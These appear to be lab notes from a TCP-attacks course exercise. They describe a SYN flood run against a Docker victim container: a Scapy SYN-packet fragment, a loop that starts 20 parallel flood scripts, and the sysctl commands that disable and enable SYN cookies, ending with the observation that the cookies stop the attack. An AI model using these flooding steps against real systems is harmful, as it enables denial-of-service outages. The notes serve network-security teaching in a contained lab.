# TCP Attacks
### how to get iface
`ifconfig | grep '10.9.0' -B1 | head -1 | cut -f1 -d ':'`
## Containers setup
- run in each the following line replacing `role` with what the container is, just to recognize them easier from the prompt
  - ```echo 'PS1="role | $PS1"' >> ~/.bashrc```

---

# Task 1: SYN Flooding Attack
## 1.1 $-$ With python
### Notes
| desc | command |
| --- | --- |
| see queue size for connections | `sysctl net.ipv4.tcp_max_syn_backlog` |
| edit queue size | `sysctl -w net.ipv4.tcp_max_syn_backlog=80` |
| check usage of queue (look for SYN-RECV, number of half-opened connections) | `netstat -nat` |
| count opened connections | `netstat -tna \| grep SYN_RECV \| wc -l` |

### On SYN cookie countermeasue
enabled by default, we can change it:
```bash
$ sysctl -a | grep syncookies # Display the SYN cookie flag 
$ sysctl -w net.ipv4.tcp_syncookies=0 # turn off SYN cookie
$ sysctl -w net.ipv4.tcp_syncookies=1 # turn on SYN cookie
```

### Solving
- set IP destination and port (the victim machine and the tcp port on which it's listening, which we found with `netstat -nat`)
  ```python
  ip = IP(dst="10.9.0.5")
  tcp = TCP(dport=23, flags='S')
  ```
- launch the python script from the attacker and monitor the recv queue on the victim
  ```bash
  # Attacker
  python3 synflood.py
  # === 
  # Victim
  watch -n 0.5 netstat -nat
  ```
- working just this way we are still able to telnet to the victim machine
- but if we try to run 20 parallel instances of the python script we can already see that we have a much greater to delay to get our telnet connection accepted:
  ```bash
  # run 10 parallel instances of the program
  for i in {1..20}
  do 
    python3 synflood_draft.py & 
  done

  # kill all the flooding scripts' processes 
  kill -9 `ps aux | grep -i flood | awk '{print $2}' | paste -s`
  ```
- with 20 parallel processes we were able to flood the victim leading to telnet timeout:
  ```
  attacker | root@docker-desktop:/# telnet 10.9.0.5
  Trying 10.9.0.5...
  telnet: Unable to connect to remote host: Connection timed out
  ```

---

## 1.2 $-$ with C
- Once compiled we can execute the C version of the synflood program, we can immediately notice, by monitoring the queue on the victim side as we did earlier, that the rate of which new connections are opened is much bigger.
- Also we can see that just 1 instance of this program is enough to flood the victim in a way that we cannot even open a telnet connection.

---

## 1.3 $-$ Enable the SYN Cookie Countermeasure
- with the countermeasure enabled we can immediately connect via telnet even with the flooding programs running. Thus the protection works very well.

---

